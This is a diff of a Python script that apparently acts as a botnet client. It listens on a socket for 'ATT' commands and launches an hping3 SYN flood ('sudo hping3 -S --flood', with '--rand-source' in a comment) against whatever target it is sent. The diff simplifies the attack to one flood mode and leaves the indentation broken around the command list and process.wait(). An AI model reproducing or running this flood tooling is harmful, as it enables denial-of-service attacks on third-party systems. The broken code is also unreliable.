@@ -23,21 +23,16 @@ def listen(sock):
             if data.startswith("ATT"):
                 parts = data.split()
                 if len(parts) > 1:
-                    if len(parts) == 2:
-                        target = parts[1]
-                        attack(target,1)
-                    else:
-                        target=parts[1]
-                        type_att =parts[2]
-                        attack(target,type_att)
+                    target = parts[1]
+                    attack(target)
+                    
         except Exception as e:
             print("Errore:", e)
         
-def attack(target,type_att):
+def attack(target):
     # hping 3 -S --flood --rand-source -p 80 {target}
 
-    # Construct the hping3 command
-    if type_att == 1:
+   
         hping_cmd = [
             "sudo", "hping3",
             "-S",
@@ -45,9 +40,7 @@ def attack(target,type_att):
             "--flood",
             target
         ]
-    elif type_att == 2:
-        hping_cmd = [ "sudo", "hping3", "-S", "-p", "--rand-source", "80","--flood", target]
-           
+             
     
     print(f"Running: {' '.join(hping_cmd)}")
     # Start the process
@@ -58,7 +51,7 @@ def attack(target,type_att):
     
     # Stop the process
     process.terminate()
-    process.wait()
+        process.wait()
     print("Hping3 stopped.")
 
 while True:
